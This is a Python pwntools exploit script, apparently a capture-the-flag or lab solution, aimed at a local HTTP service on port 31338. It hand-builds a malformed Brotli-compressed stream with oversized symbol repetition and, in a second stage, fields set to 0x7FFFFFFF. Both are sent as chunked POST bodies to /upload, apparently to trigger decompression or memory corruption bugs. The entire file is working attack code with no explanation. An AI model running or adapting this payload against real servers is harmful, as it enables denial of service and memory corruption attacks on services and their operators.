#!/usr/bin/env python3

from time import sleep

from pwn import *

context.log_level = "info"

HOST = "127.0.0.1"
PORT = 31338


class Bits:
    def __init__(self):
        self.data = bytearray()
        self.value = self.used = 0

    def put(self, value, count):
        for i in range(count):
            self.value |= ((value >> i) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = self.used = 0

    def raw(self, data):
        assert self.used == 0
        self.data += data

    def bytes(self):
        if self.used:
            self.data.append(self.value)
        return bytes(self.data)


def tree(bits, size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (size - 1).bit_length())


def varint(bits, value):
    if value == 0:
        bits.put(0, 1)
    elif value == 1:
        bits.put(1, 1)
        bits.put(0, 3)
    else:
        width = value.bit_length() - 1
        bits.put(1, 1)
        bits.put(width, 3)
        bits.put(value - (1 << width), width)


def stage1():
    b = Bits()
    b.put(1, 1)
    b.put(0, 3)
    b.put(2, 3)
    b.put(0, 1)
    b.put(2, 2)
    b.put(0xFFFFFF, 24)
    b.put(0, 1)
    varint(b, 0)
    varint(b, 1)
    tree(b, 4, 0)
    tree(b, 26, 25)
    b.put(0xFFFFFF, 24)
    varint(b, 0)
    b.put(3, 6)
    b.put(0, 2)
    varint(b, 0)
    varint(b, 0)
    tree(b, 256, 0)
    tree(b, 704, 130)
    tree(b, 704, 130)
    tree(b, 400, 184)

    count = 1 << 24
    done = 0
    while b.used and done < count:
        b.put(4, 11)
        done += 1

    block = Bits()
    for _ in range(8):
        block.put(4, 11)
    groups, tail = divmod(count - done, 8)
    b.raw(block.bytes() * groups)
    for _ in range(tail):
        b.put(4, 11)
    return b.bytes() + b"\0" * 3


def stage2():
    data = bytearray(127)
    data[7] = 8
    data[15:19] = p32(0x7FFFFFFF)
    data[19:23] = p32(0x7FFFFFFF)
    data[23:27] = p32(0x7FFFFFFF)
    return bytes(data)


def chunk(data):
    return f"{len(data):x}\r\n".encode() + data + b"\r\n"


headers = (
    b"POST /upload HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    b"Content-Encoding: br\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: close\r\n\r\n"
)

first, second = stage1(), stage2()
log.info(f"stage1={len(first)} stage2={len(second)}")
io = remote(HOST, PORT)
io.send(headers + chunk(first))
sleep(0.5)
io.send(chunk(second) + b"0\r\n\r\n")
io.close()
